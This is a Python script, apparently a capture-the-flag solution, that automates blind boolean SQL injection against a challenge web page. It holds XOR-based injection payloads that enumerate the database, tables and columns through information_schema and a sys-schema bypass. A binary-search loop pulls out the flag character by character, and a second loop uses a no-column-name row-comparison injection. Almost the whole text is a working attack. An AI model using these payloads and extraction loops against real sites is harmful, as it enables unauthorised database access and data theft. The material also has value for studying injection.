import requests
import time

url="http://ca42d7e5-2039-4f72-953f-391b49aa4b1c.node4.buuoj.cn:81/index.php"
name=''

def demo_1():
    for i in range(1,50):
        print(i)
        low=32
        high=128
        mid=(low+high)//2
        while low<high:
            #payload = "0^(ascii(substr((select(database())),%d,1))>%d)" % (i, mid)
            #payload = "0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='give_grandpa_pa_pa_pa')),%d,1))>%d)"%(i,mid)
            #payload = "0^(ascii(substr((select(group_concat(table_name))from(sys.x$schema_table_statistics_with_buffer)where(table_schema=database())),%d,1))>%d)"%(i,mid)
            #payload = "0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='f1ag_1s_h3r3_hhhhh')),%d,1))>%d)"%(i,mid)
            #payload = "0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))>%d)"%(i,mid)
            data = {
                "id" : payload
            }
            r = requests.post(url,data=data)
            if 'Nu1L' in r.text:
                low = mid+1
            else:
                high=mid
            mid=(low+high)//2
            if(mid==32):
                break
        name=name+chr(mid)
        print (name)


def add(flag):    #无列名注入
    res = ''
    res += flag
    return res
flag = ''
for i in range(1,200):
    for char in range(32, 127):
        hexchar = add(flag + chr(char))
        payload = '0^((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)
        print(payload)
        data = {'id':payload}
        r = requests.post(url=url, data=data)
        if 'Nu1L' in r.text:
            flag += chr(char-1)
            print(flag)
            break

